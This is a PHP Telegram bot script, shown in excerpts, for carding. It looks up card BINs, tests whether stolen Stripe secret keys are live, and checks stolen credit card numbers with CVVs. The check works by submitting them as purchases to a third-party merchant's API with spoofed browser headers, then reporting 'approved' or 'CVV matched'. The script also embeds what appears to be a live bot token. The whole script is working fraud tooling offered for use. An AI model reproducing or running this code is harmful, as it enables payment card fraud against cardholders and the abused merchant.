...
///https://api.telegram.org/bot1720892573:AAGbYu0AZDhMDTORN7KLa_gAoKipevcoVOA/setwebhook?url=https://pepesad.herokuapp.com/bot.php



$botToken = "1720892573:AAGbYu0AZDhMDTORN7KLa_gAoKipevcoVOA"; // Enter ur bot token
...
sendMessage($chatId, "<b>Hello there!!%0AType /cmds to know all my commands!!%0A%0ABot by: 【﻿ＩＡＮ】</b>");
}

//////////=========[Cmds Command]=========//////////

elseif ((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)){
sendMessage($chatId, "<u>Bin lookup:</u> <code>!bin</code> xxxxxx%0A<u>SK Key Check:</u> <code>!sk</code> sk_live%0A<u>Stripe:</u> <code>!chk</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Info:</u> <code>/info</code> To know ur info%0A%0A<b>Bot  by: 【﻿ＩＡＮ】</b>");
}

//////////=========[Info Command]=========//////////

elseif ((strpos($message, "!info") === 0)||(strpos($message, "/info") === 0)){
sendMessage($chatId, "<u>ID:</u> <code>$userId</code>%0A<u>First Name:</u> $firstname%0A<u>Username:</u> @$username%0A%0A<b>Bot by: 【﻿ＩＡＮ】 </b>");
}
...
curl_close($ch);
sendMessage($chatId, '<b>🟢 Valid Bin</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.''.$emoji.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Currency:</b> '.$currency.'%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by: 【﻿ＩＡＮ】 </b>');
}
curl_close($ch);
...
curl_setopt($ch, CURLOPT_URL, 'https://api.business-in-a-box.com/buy/7Vl4zbqXxY3aprOZ?');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'host: api.business-in-a-box.com',
'accept: application/json, text/plain, */*',
'accept-language: en-GB,en-US;q=0.9,en;q=0.8' ,
'content-type: text/plain',
'origin: https://www.business-in-a-box.com',
'referer: https://www.business-in-a-box.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.88 Mobile Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
...
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"ccdata":{"FirstName":"'.$name.'","LastName":"'.$last.'","FullName":null,"Email":"'.$email.'","Phone":"'.$phone.'","CreditCardNumber":"'.$cc.'","CreditCardType":"1","ExpMonth":"'.$mes.'","ExpYear":"'.$ano.'","CVV":"'.$cvv.'","CountryId":"840","StateId":"'.$state.'","token":"567a6ea32e112067182e96848fb0a0be","transactionLanguage":"en","source":"WEBAPP"},"actions":["processTransaction","generateLicense","attachLicense","emailList","updateBusiness"],"affiliate":{}}');
...
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b> 🟢『 ★ CVV MATCHED ★ 』</b>%0A<u>BANK: </u> '.$bank1.'%0A<u>COUNTRY: </u> '.$name1.'%0A<u>BRAND:</u> '.$brand.'%0A<u>CARD: </u> '.$scheme.'%0A<u>TYPE: </u> '.$type.'%0A<u>GATEWAY:</u> <b>STRIPE</b>%0A<u>Checked By: </u> @'.$username.'<u>%0ATime Taken: </u> <b>'.$time.'s</b>%0A%0A<b>Bot by: 【﻿ＩＡＮ】</b>');
}
...
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> EXPIRED KEY%0A%0A<b>Bot by:  【﻿ＩＡＮ】 </b>");
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> INVALID KEY%0A%0A<b>Bot  by: 【﻿ＩＡＮ】 </b>");
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Testmode Charges Only%0A%0A<b>Bot  by: 【﻿ＩＡＮ】 </b>");
}else{
sendMessage($chatId, "<b> 🟢 LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>RESPONSE:</u> SK LIVE!!%0A%0A<b>Bot by: 【﻿ＩＡＮ】 </b>");
}}
